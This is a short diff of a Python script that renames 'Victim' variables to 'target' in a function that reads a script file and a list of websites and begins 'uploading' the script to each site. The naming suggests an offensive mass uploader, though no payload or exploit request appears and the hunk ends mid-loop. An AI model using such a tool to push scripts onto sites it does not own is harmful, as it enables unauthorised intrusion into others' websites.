@@ -32,13 +32,13 @@ def x(tetew):
    
    return str(ipt)
 
-def Finch(script,target_file="Victim.txt"):
+def Finch(script,target_file="target.txt"):
    op = open(script,"r").read()
-   with open(Victim_file, "r") as target:
-      Victim = Victim.readlines()
+   with open(target_file, "r") as target:
+      target = target.readlines()
       s = requests.Session()
-      print("uploading file to %d website"%(len(Victim)))
-      for web in Victim:
+      print("uploading file to %d website"%(len(target)))
+      for web in target:
          try:
             site = web.strip()
             if site.startswith("http://") is False:
